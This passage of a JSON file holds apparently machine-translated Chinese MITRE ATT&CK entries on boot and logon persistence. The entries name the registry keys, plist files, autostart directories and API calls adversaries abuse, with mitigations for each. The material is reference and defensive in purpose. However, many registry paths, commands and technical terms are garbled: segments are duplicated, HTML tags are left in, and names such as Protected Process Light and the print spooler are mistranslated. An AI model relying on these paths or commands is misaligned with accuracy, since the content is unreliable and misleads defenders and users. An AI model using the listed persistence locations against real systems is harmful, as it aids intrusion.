          "content": "。该值会导致Windows在启动时检查硬盘的文件系统完整性，如果系统被异常关闭。对手可以将其他程序或进程添加到此注册表值中，这些程序将在启动时自动启动。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用这些配置位置来执行恶意软件，例如远程访问工具，以通过系统重新启动来保持持久性。对手也可以使用伪装来使注册表的条目看起来好像与合法计划相关联。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1547.002",
    "name": "Authentication Package",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Autostart Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "在系统启动时，对手可能会滥用身份验证软件包以执行DLL。Windows身份验证软件包DLL在系统启动时由本地安全管理局（LSA）加载。它们为操作系统提供了多个登录过程和多个安全协议的支持。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用LSA身份验证软件包提供的AutoStart机制来持久，通过在Windows注册表位置中放置对二进制的引用"
        },
        {
          "type": "code",
          "content": " HKLM \\ System \\ CurrentControlset \\ CurrentControlset \\ control \\ lsa \\ "
        },
        {
          "type": "text",
          "content": "，并使用"
        },
        {
          "type": "code",
          "content": "的密钥值> >“身份验证软件包” = <目标二进制> "
        },
        {
          "type": "text",
          "content": "。然后，当加载身份验证软件包时，系统将执行二进制文件。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1025",
        "name": "特权过程完整性",
        "description": [
          [
            {
              "type": "text",
              "content": "Windows 8.1，Windows Server 2012 R2和更高版本，可以通过设置注册表密钥"
            },
            {
              "type": "code",
              "content": " HKLM \\ System \\ CurrentControlset \\ control \\ lsa \\ lsa \\ runasppl "
            },
            {
              "type": "text",
              "content": "来使LSA运行为受保护的过程灯（PPL），这需要LSA加载的所有DLL将由Microsoft签名。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1547.003",
    "name": "Time Providers",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Autostart Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用时间提供商在系统启动时执行DLL。Windows Time Service（W32Time）可以在域内和内部进行时间同步。W32Time时间提供商负责从硬件/网络资源中检索时间戳记，并将这些值输出到其他网络客户端。"
        }
      ],
      [
        {
          "type": "text",
          "content": "时间提供商被实现为动态链接库（DLL），该库在"
        },
        {
          "type": "code",
          "content": " hkey_local_machine \\ system \\ currentControlset \\ services \\ w32Time \\ timeProviders \\ "
        },
        {
          "type": "text",
          "content": "的子键中注册。由服务控制管理器执导的时间提供商管理器加载并启动在系统启动和/或更改参数时在此密钥下列出和启用的时间提供商。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用这种体系结构来建立持久性，特别是通过注册和使恶意DLL作为时间提供商。时间提供商注册需要管理员特权，尽管执行将在本地服务帐户的上下文中运行。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑使用组策略对W32Time DLL进行配置和块添加/修改。"
            }
          ]
        ]
      },
      {
        "id": "M1024",
        "name": "限制注册表许可",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑使用组策略来配置并将修改为注册表中的W32Time参数。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1547.004",
    "name": "Winlogon Helper DLL",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Autostart Execution",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "当用户登录时，对手可能会滥用Winlogon的功能执行DLL和/或可执行文件。Winlogon.exe是负责登录/logoff的操作的Windows组件，以及由CTRL-ALT-ALT-DELETE触发的安全注意序列（SAS）。"
        },
        {
          "type": "code",
          "content": " hklm \\ Software [\\ WOW6432Node \\] \\ Microsoft \\ Windows \\ Windows NT \\ CurrentVersion \\ Winlogon \\ "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " HKCU \\ software \\ Microsoft \\ Microsoft \\ Microsoft \\ Microsoft \\ windows nt nt \\ currentversion \\ currentversion \\ winlogon \\ winlogon \\ "
        },
        {
          "type": "text",
          "content": "用于管理支持Winlogon的其他帮助程序和功能。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对这些注册表密钥的恶意修改可能会导致Winlogon加载和执行恶意DLL和/或可执行文件。具体而言，已知以下亚基很容易受到虐待："
        }
      ],
      [
        {
          "type": "list",
          "content": "winlogon \\ Notify-指向处理Winlogon事件的通知软件包DLL"
        },
        {
          "type": "list",
          "content": "winlogon \\ userInit-指向用户登录时执行的用户初始化程序的用户初始化程序"
        },
        {
          "type": "list",
          "content": "winlogon \\ shell-指向Explorer.exe，用户登录时执行的系统外壳"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以利用这些功能反复执行恶意代码并建立持久性。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "通过使用能够审核和/或阻止未知DLL的应用程序控制工具（例如Applocker），识别并阻止通过Winlogon Helper进程执行的潜在恶意软件。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制用户帐户的特权，以便只有授权的管理员才能执行Winlogon助手更改。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1547.005",
    "name": "Security Support Provider",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Autostart Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用安全支持提供商（SSP）在系统启动时执行DLL。Windows SSP DLL被加载到系统启动时的本地安全管理局（LSA）过程中。加载到LSA中后，SSP DLL可以访问存储在Windows中的加密和明文密码，例如任何已记录的用户域密码或智能卡引脚。"
        }
      ],
      [
        {
          "type": "text",
          "content": "The SSP configuration is stored in two Registry keys: "
        },
        {
          "type": "code",
          "content": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages"
        },
        {
          "type": "text",
          "content": " and "
        },
        {
          "type": "code",
          "content": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages"
        },
        {
          "type": "text",
          "content": "。对手可以修改这些注册表键以添加新的SSP，该键将在下次系统启动时或添加SecurityPackage Windows Windows API函数时加载。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1025",
        "name": "特权过程完整性",
        "description": [
          [
            {
              "type": "text",
              "content": "Windows 8.1，Windows Server 2012 R2和后来的版本可以通过设置注册表密钥"
            },
            {
              "type": "code",
              "content": " HKLM \\ System \\ CurrentControlset \\ control \\ lsa \\ lsa \\ runasppl "
            },
            {
              "type": "text",
              "content": "来使LSA运行为受保护的过程灯（PPL），这需要所有SSP DLL将由Microsoft签名。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1547.006",
    "name": "Kernel Modules and Extensions",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Autostart Execution",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以修改内核以自动在系统启动上执行程序。可加载的内核模块（LKMS）是可以按需加载并将其卸载到内核中的代码。它们扩展了内核的功能，而无需重新启动系统。例如，一种类型的模块是设备驱动程序，它允许内核访问连接到系统的硬件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "当恶意使用时，LKM可以是具有最高操作系统特权（环0）运行的内核模式rootkit。基于LKM的rootkit的常见功能包括：隐藏自身，文件，过程和网络活动的选择性隐藏，以及篡改日志，提供身份验证的后门，并启用对非私人用户的root访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "内核扩展（也称为kext）在macOS中使用，将功能加载到类似于Linux的LKMS的系统上。由于内核负责执行安全性，并且内核扩展是按照内核而运行的，因此Kexts不受MACOS安全策略的管辖。通过"
        },
        {
          "type": "code",
          "content": " kextload "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " kextunload "
        },
        {
          "type": "text",
          "content": "命令加载和卸载Kexts。Kexts需要与Apple允许其签署内核扩展名一起授予特权的开发人员ID签名。没有这些特权的开发人员仍然可以签署Kext，但是除非禁用SIP，否则它们不会加载。如果启用了SIP，则在添加到AUXKC之前验证KEXT签名。"
        }
      ],
      [
        {
          "type": "text",
          "content": "自MacOS Catalina 10.15以来，内核扩展已被贬低，而有利于系统扩展。但是，由于内核编程接口没有系统扩展，因此仍然允许KEXT作为“传统系统扩展”。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用LKM和KEXT在系统上进行持久性和/或特权升级。在野外发现了例子，并且还有一些相关的开源项目。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1049",
        "name": "防病毒/反疑问软件",
        "description": [
          [
            {
              "type": "text",
              "content": "检测Linux rootkit的常见工具包括：rkhunter，Chrootkit，尽管可以设计rootkits来逃避某些检测工具。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "应用程序控制和软件限制工具，例如SELINUX，KSPP，GRSECURITY MODHARDEN和LINUX内核调整可以帮助限制内核模块加载。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制对根帐户的访问，并防止用户通过适当的特权分离和限制特权升级机会加载内核模块和扩展。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "使用MDM禁用用户安装或批准内核扩展的能力，并确保所有批准的内核扩展名与"
            },
            {
              "type": "code",
              "content": " com.apple.syspolicy.kernel-extension-extension-policy-Policy-Policy-Policy "
            },
            {
              "type": "text",
              "content": "中指定的策略保持一致。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1547.007",
    "name": "Re-opened Applications",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Autostart Execution",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会修改PLIST文件以自动运行应用程序时，当用户登录时。当用户通过MacOS图形用户界面（GUI）重新登录或重新启动时，向用户提供了一个提示，并使用复选框为“重新打开Windows重新打开窗口”。在”。选择后，当前打开的所有应用程序都将添加到名为"
        },
        {
          "type": "code",
          "content": " com.apple.loginwindow的属性列表文件中。[uuid] .plist "
        },
        {
          "type": "text",
          "content": " </code> </code> </code>〜/library/preferences/preferences/byhost </byhost </code>目录。此文件中列出的应用程序会自动重新打开用户的下一个登录。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以通过在"
        },
        {
          "type": "code",
          "content": " com.apple.loginwindow中添加恶意应用程序路径来建立持久性。[uuid] .plist "
        },
        {
          "type": "text",
          "content": "文件在用户登录时执行有效载荷。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "可以使用以下终端命令完全禁用此功能："
            },
            {
              "type": "code",
              "content": "默认值WRITE -G ApplePersistence -Bool no "
            },
            {
              "type": "text",
              "content": "。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "在日志记录时持有移位键可以防止应用自动打开。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1547.008",
    "name": "LSASS Driver",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Autostart Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会修改或添加LSAS驱动程序以获得受损系统的持久性。Windows安全子系统是一组组件，可管理和执行计算机或域的安全策略。本地安全局（LSA）是负责本地安全策略和用户身份验证的主要组件。LSA包括与其他各种安全功能关联的多个动态链接库（DLL），所有这些功能都在LSA子系统服务（LSASS）LSASS.EXE PROCESS的上下文中运行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以针对LSAS驱动程序以获得持久性。通过更换或添加非法驱动程序（例如，劫持执行流），对手可以使用LSA操作来连续执行恶意有效载荷。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1043",
        "name": "凭证访问保护",
        "description": [
          [
            {
              "type": "text",
              "content": "在Windows 10和Server 2016上，启用Windows Defender Guard可以在没有任何设备驱动程序的情况下在孤立的虚拟化环境中运行LSASS.EXE。"
            }
          ]
        ]
      },
      {
        "id": "M1025",
        "name": "特权过程完整性",
        "description": [
          [
            {
              "type": "text",
              "content": "在Windows 8.1和Server 2012 R2上，通过设置注册表密钥"
            },
            {
              "type": "code",
              "content": " HKEY_LOCAL_MACHINE \\ SYSTEM \\ CurrentControlset \\ control \\ lsa \\ lsa \\ runasppl "
            },
            {
              "type": "text",
              "content": " "
            },
            {
              "type": "code",
              "content": " dword：00000001 "
            },
            {
              "type": "text",
              "content": "。LSA保护可确保只有在通过Microsoft签名签名并遵守Microsoft Security Security Development Lifececle（SDL）流程指导时，才能加载LSA插件和驱动程序。"
            }
          ]
        ]
      },
      {
        "id": "M1044",
        "name": "限制库加载",
        "description": [
          [
            {
              "type": "text",
              "content": "确保启用安全dll搜索模式"
            },
            {
              "type": "code",
              "content": " hkey_local_machine \\ system \\ currentControlset \\ control \\ control \\ session manager \\ safedllsearchmode "
            },
            {
              "type": "text",
              "content": "降低lsass.exe加载恶意代码库的风险。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1547.009",
    "name": "Shortcut Modification",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Autostart Execution",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以创建或修改可以在系统引导或用户登录过程中执行程序的快捷方式。快捷方式或符号链接用于引用当系统启动过程单击或执行快捷方式时将打开或执行的其他文件或程序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用启动文件夹中的快捷方式，以执行其工具并实现持久性。尽管经常在感染链中用作有效载荷（例如，矛盾的依恋），但对手也可能会创建新的快捷方式作为间接手段，同时还滥用伪装以使恶意快捷方式出现为合法计划。对手还可以编辑目标路径或完全替换现有的快捷方式，以便执行其恶意软件，而不是预期的合法程序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "快捷方式也可以通过实施其他方法来滥用以确立持久性。例如，可以修改LNK浏览器扩展（例如浏览器扩展程序）以持续启动恶意软件。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制谁可以在Windows中创建符号链接到适当的组（例如管理员）和虚拟化的必要组的权限。这可以通过GPO：计算机配置> [策略]> Windows设置>安全设置>本地策略>用户权利分配：创建符号链接。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1547.010",
    "name": "Port Monitors",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Autostart Execution",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用端口监视器在系统启动期间运行dll提供的dll，以持续或特权升级。可以通过"
        },
        {
          "type": "code",
          "content": " addMonitor "
        },
        {
          "type": "text",
          "content": " API调用设置端口监视器，以设置在启动时加载的DLL。该DLL可以位于"
        },
        {
          "type": "code",
          "content": " c：\\ Windows \\ System32 "
        },
        {
          "type": "text",
          "content": "中，并将由PRINT SPOOLER SERVICE（SPOOLSV.EXE）加载。spoolsv.exe过程也在系统级别的权限下运行。另外，如果权限允许将DLL的完全归结路径名编写为"
        },
        {
          "type": "code",
          "content": " hklm \\ System \\ currentControlset \\ Control \\ control \\ print \\ print \\ monitors "
        },
        {
          "type": "text",
          "content": "，则可以加载任意DLL。"
        }
      ],
      [
        {
          "type": "text",
          "content": "注册表密钥包含以下条目："
        }
      ],
      [
        {
          "type": "list",
          "content": "本地端口"
        },
        {
          "type": "list",
          "content": "标准TCP/IP端口"
        },
        {
          "type": "list",
          "content": "USB监视器"
        },
        {
          "type": "list",
          "content": "WSD端口"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用此技术在启动时加载恶意代码，这将持续在系统重启并执行系统上。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1547.012",
    "name": "Print Processors",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Autostart Execution",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用印刷处理器在系统启动期间以持久性和/或特权升级而运行恶意DLL。打印处理器是启动过程中"
        },
        {
          "type": "code",
          "content": " spoolsv.exe "
        },
        {
          "type": "text",
          "content": "加载的DLL。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会通过在启动时添加加载恶意DLL的打印处理器来滥用印刷吊杆服务。可以通过"
        },
        {
          "type": "code",
          "content": " addPrintProcessor "
        },
        {
          "type": "text",
          "content": " api调用具有"
        },
        {
          "type": "code",
          "content": " seloAddriverPrivilege "
        },
        {
          "type": "text",
          "content": "启用的帐户的API调用。另外，可以通过添加"
        },
        {
          "type": "code",
          "content": " hklm \\ System \\ [CurrentControlset或ControlSet001] \\ Control \\ print \\ Environments \\ [Windows X64] \\ Print Proceserors \\ [USER \\ [USER \\ [USER \\ [USER \\ [USER \\ [USER \\ [user定义的] \\驱动程序"
        },
        {
          "type": "text",
          "content": "指向DLL的注册表密钥。"
        }
      ],
      [
        {
          "type": "text",
          "content": "为了使恶意打印处理器正确安装，有效载荷必须位于专用系统打印处理器目录中，可以使用"
        },
        {
          "type": "code",
          "content": " getPrintProcessordirectory "
        },
        {
          "type": "text",
          "content": " api呼叫找到，或通过此目录的相对路径引用。安装打印处理器后，必须重新启动的Print Spooler服务以使其运行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "印刷剥离器服务在系统级别的权限下运行，因此，由对手安装的打印处理器可以在特权升高的情况下运行。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制可以通过禁用"
            },
            {
              "type": "code",
              "content": " seloaddriverPrivilege "
            },
            {
              "type": "text",
              "content": "来加载或卸载设备驱动程序的用户帐户。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1547.013",
    "name": "XDG Autostart Entries",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Autostart Execution",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "当用户的桌面环境加载时，对手可以添加或修改XDG AutoStart条目以执行恶意程序或命令。XDG AutoStart条目可用于任何符合XDG的Linux系统。XDG AutoStart条目使用桌面条目文件（"
        },
        {
          "type": "code",
          "content": " .desktop "
        },
        {
          "type": "text",
          "content": "）在用户登录时配置用户的桌面环境。这些配置文件确定用户登录时启动哪些应用程序，将关联的应用程序定义为打开特定的文件类型，并定义用于打开可移动媒体的应用程序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用此功能来建立持久性，通过在"
        },
        {
          "type": "code",
          "content": " exec "
        },
        {
          "type": "text",
          "content": " .desktop </code>配置文件中添加恶意二进制或命令的路径。当用户登录处加载用户的桌面环境时，"
        },
        {
          "type": "code",
          "content": " .desktop "
        },
        {
          "type": "text",
          "content": "位于XDG AutoStart目录中的文件将自动执行。系统范围的AutoStart条目位于"
        },
        {
          "type": "code",
          "content": "/etc/xdg/autostart "
        },
        {
          "type": "text",
          "content": "目录中，当时用户条目位于"
        },
        {
          "type": "code",
          "content": "〜/.config/autostart </autostart "
        },
        {
          "type": "text",
          "content": " Directory中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会将这一技术与伪装结合，以将恶意的AutoStart条目与合法的计划相结合。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1033",
        "name": "限制软件安装",
        "description": [
          [
            {
              "type": "text",
              "content": "仅将软件安装限制在受信任的存储库中，并谨慎对待孤儿软件包。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "限制对XDG AutoStart条目的写入访问权限，以仅选择特权用户。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制用户帐户的特权，因此只有授权的特权用户才能创建和修改XDG AutoStart条目。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1547.014",
    "name": "Active Setup",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Autostart Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过在本地机器的活动设置中添加注册表密钥来实现持久性。Active Setup是一种Windows机制，用户登录时用于执行程序。注册表密钥中存储的值将在用户登录到计算机后执行。这些程序将在用户的上下文下执行，并将具有该帐户相关的权限级别。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会通过在"
        },
        {
          "type": "code",
          "content": " HKLM \\ Software \\ Microsoft \\ Active Setup \\ Aptive Setup \\安装组件\\ "
        },
        {
          "type": "text",
          "content": "下创建一个密钥来滥用活动设置，并为"
        },
        {
          "type": "code",
          "content": " stubpath "
        },
        {
          "type": "text",
          "content": "设置恶意值。此值将作为用户登录到计算机时将执行的程序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以滥用这些组件来执行恶意软件，例如远程访问工具，以通过系统重新启动保持持久性。对手也可以使用伪装来使注册表的条目看起来好像与合法计划相关联。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1547.015",
    "name": "Login Items",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Autostart Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会在用户登录时添加登录项目以执行以获得持久性或升级特权。登录项目是当用户登录时自动启动的应用程序，文档，文件夹或服务器连接。可以通过共享文件列表或服务管理框架添加登录项目。共享文件列表登录项目可以使用脚本语言（例如AppleScript）设置，而服务管理框架使用API调用"
        },
        {
          "type": "code",
          "content": " smloginiTemSetEnabled "
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "使用服务管理框架杠杆安装的登录项目"
        },
        {
          "type": "code",
          "content": "启动"
        },
        {
          "type": "text",
          "content": "在系统偏好中不可见，只能由创建它们的应用程序删除。使用共享文件列表创建的登录项目在系统首选项中可见，可以在启动时隐藏应用程序，并通过启动服务（而不是启动）执行，以打开应用程序，文档或URL，而无需使用Finder。用户和应用程序使用登录项目来配置其用户环境以启动常用的服务或应用程序，例如电子邮件，聊天和音乐应用程序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以利用AppleScript和本机API调用来创建登录项目来产生恶意可执行文件。在MACOS上的版本10.5之前，对手可以通过使用AppleScript将Apple Events发送到“系统事件”过程中添加登录项目，该过程具有用于操纵登录项目的AppleScript词典。对手可以使用"
        },
        {
          "type": "code",
          "content": "告诉应用程序“系统事件”之类的命令，以属性/路径/to/operable "
        },
        {
          "type": "text",
          "content": "在最终登录项目。此命令将恶意执行的路径添加到位于"
        },
        {
          "type": "code",
          "content": "〜/library/application support/com.apple.backgroundtaskmanagementagentagent/courckmentItems.btm "
        },
        {
          "type": "text",
          "content": "的登录项目文件列表中。对手还可以使用登录项目来启动可执行文件，该可执行文件可用于远程控制受害者系统，也可以通过提示用户凭证来促进特权升级。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1037.001",
    "name": "Logon Script (Windows)",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Initialization Scripts",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用在登录初始化时自动执行的Windows登录脚本来建立持久性。Windows允许每当特定用户或一组用户登录到系统时运行登录脚本。这是通过将脚本的路径添加到"
        },
        {
          "type": "code",
          "content": " hkcu \\ Environment \\ userInitMprLogonScript "
        },
        {
          "type": "text",
          "content": "注册表密钥来完成的。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用这些脚本来保持对单个系统的持久性。根据登录脚本的访问配置，可能需要本地凭据或管理员帐户。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1024",
        "name": "限制注册表许可",
        "description": [
          [
            {
              "type": "text",
              "content": "确保为注册表设置适当的权限，以防止用户修改可能导致持久性的登录脚本的密钥。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1037.002",
    "name": "Login Hook",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Initialization Scripts",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用登录钩在用户登录上建立持久性。登录钩是一个PLIST文件，指向特定脚本以在用户登录时使用根特权执行的特定脚本。PLIST文件位于"
        },
        {
          "type": "code",
          "content": "/library/preferences/com.apple.loginwindow.plist "
        },
        {
          "type": "text",
          "content": "文件中，可以使用"
        },
        {
          "type": "code",
          "content": " defaults "
        },
        {
          "type": "text",
          "content": " command> command> commandline实用程序进行修改。对于注销挂钩，此行为是相同的，在该挂钩上可以在用户注销时执行脚本。所有挂钩都需要管理员权限修改或创建钩子。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用"
        },
        {
          "type": "code",
          "content": " loginhook "
        },
        {
          "type": "text",
          "content": " </code> logouthook </code> logouthook </code> key-键 - 价值对。恶意脚本将在下一个用户登录时执行。如果已经存在登录钩，则对手可以将其他命令添加到现有的登录钩中。一次在系统上只能有一个登录和注销挂钩。"
        }
      ],
      [
        {
          "type": "text",
          "content": "注意：在10.11版的MacOS中对登录钩进行了弃用，以支持发射守护程序和发射代理"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "将对登录脚本的访问限制为特定的管理员。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1037.003",
    "name": "Network Logon Script",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Initialization Scripts",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用在登录初始化时自动执行的网络登录脚本来建立持久性。可以使用Active Directory或组策略对象分配网络登录脚本。这些登录脚本以分配给用户的特权运行。根据网络中的系统，初始化这些脚本之一可以应用于多个或可能的所有系统。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用这些脚本来保持网络上的持久性。根据登录脚本的访问配置，可能需要本地凭据或管理员帐户。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "将对登录脚本的访问限制为特定的管理员。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1037.004",
    "name": "RC Scripts",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Initialization Scripts",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过修改RC脚本来建立持久性，而RC脚本在Unix式系统的启动过程中执行。这些文件允许系统管理员以不同的运行级别映射和启动自定义服务。RC脚本需要ROOT特权才能修改。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以通过在"
        },
        {
          "type": "code",
          "content": " rc.local "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " rc.common "
        },
        {
          "type": "text",
          "content": "以及其他针对Unix-like分布的RC脚本中添加恶意二进制路径或shell命令来建立持久性。重新启动后，系统将脚本内容执行为根，从而导致持久性。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对RC脚本的对手滥用对使用root用户（例如IoT或嵌入式系统）的轻质Unix样发行版特别有效。"
        }
      ],
      [
        {
